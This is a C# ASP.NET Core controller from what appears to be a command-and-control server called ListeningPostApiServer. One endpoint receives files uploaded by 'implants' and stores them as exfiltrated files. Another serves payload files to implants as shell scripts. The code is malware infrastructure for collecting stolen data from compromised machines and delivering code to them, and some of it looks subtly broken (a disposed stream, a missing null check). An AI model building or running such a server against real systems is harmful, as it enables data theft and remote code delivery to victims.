using ListeningPostApiServer.Data;
using ListeningPostApiServer.Interfaces;
using ListeningPostApiServer.Models;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System;
using System.IO;
using System.Net.Mime;
using System.Threading.Tasks;

namespace ListeningPostApiServer.Controllers
{
    [ApiController]
    [Route("[Controller]")]
    public class FileController : ControllerBase
    {
        public FileRepository FileRepository;
        public DbContext Context;

        public FileController(IRepository<FileBase> fileRepository)
        {
            FileRepository = (FileRepository)fileRepository;
            Context = FileRepository.Context;
        }

        [HttpPost("pull/{nodeId}")]
        public async Task<IActionResult> UploadToServer(int nodeId, IFormFile file)
        {

            //if (file.Length <= 0) return BadRequest();

            var filePath = Path.GetTempFileName();

            using (var stream = new FileStream(filePath, FileMode.Create))
            {
                await file.CopyToAsync(stream);
            }

            var implant = await FileRepository.Context.Set<Implant>().FindAsync(nodeId);

            var newExFile = new ExfiltratedFile()
            {
                TempFilePath = filePath,
                FromImplant = implant,
                ActualFileName = file.FileName,
            };

            await FileRepository.CreateAsync(newExFile);
            await FileRepository.SaveChangesAsync();

            return Ok();
        }

        [HttpPost("push/{nodeId}")]
        public async Task<IActionResult> Push(int nodeId, [FromBody] FileBase fileRequested)
        {
            var fileToSend = await FileRepository.Context.Set<PayloadFile>()
                .FirstOrDefaultAsync(f => f.ActualFileName == fileRequested.ActualFileName);

            if (fileToSend == null) return BadRequest();

            using (var stream = new FileStream(fileToSend.TempFilePath, FileMode.Open))
            {
                return Ok(File(stream, "application/x-sh", fileToSend.ActualFileName));
            }
        }
    }
}